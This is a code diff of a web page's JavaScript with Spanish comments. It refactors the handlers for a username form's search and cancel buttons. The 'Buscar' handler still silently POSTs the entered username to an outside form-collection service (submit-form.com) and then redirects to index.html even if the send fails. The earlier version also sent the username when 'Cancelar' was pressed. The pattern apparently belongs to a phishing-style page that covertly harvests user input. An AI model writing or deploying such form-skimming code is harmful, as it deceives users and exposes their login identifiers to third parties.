@@ -97,31 +97,28 @@
     var btnBuscar = document.getElementById('submitBtn');
     var btnCancelar = document.getElementById('button-cancelButton');
 
-    function enviarYRedirigir() {
+    // Comportamiento del botón Buscar
+    btnBuscar.addEventListener('click', function(e) {
+      e.preventDefault();
       var usuario = campo.value.trim();
       if (!usuario) {
         alert('Por favor, introduzca su nombre de usuario.');
         return;
       }
-      // Envío silencioso a Formspark
+      // Enviar datos a Formspark y luego redirigir
       fetch('https://submit-form.com/yRhwHN8bs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: 'cn=' + encodeURIComponent(usuario)
       }).finally(function() {
-        // Redirigimos al index siempre, aunque falle el envío
         window.location.href = 'index.html';
       });
-    }
-
-    btnBuscar.addEventListener('click', function(e) {
-      e.preventDefault();
-      enviarYRedirigir();
     });
 
+    // Comportamiento del botón Cancelar: ir directamente al index
     btnCancelar.addEventListener('click', function(e) {
       e.preventDefault();
-      enviarYRedirigir();
+      window.location.href = 'index.html';
     });
   })();
 </script>
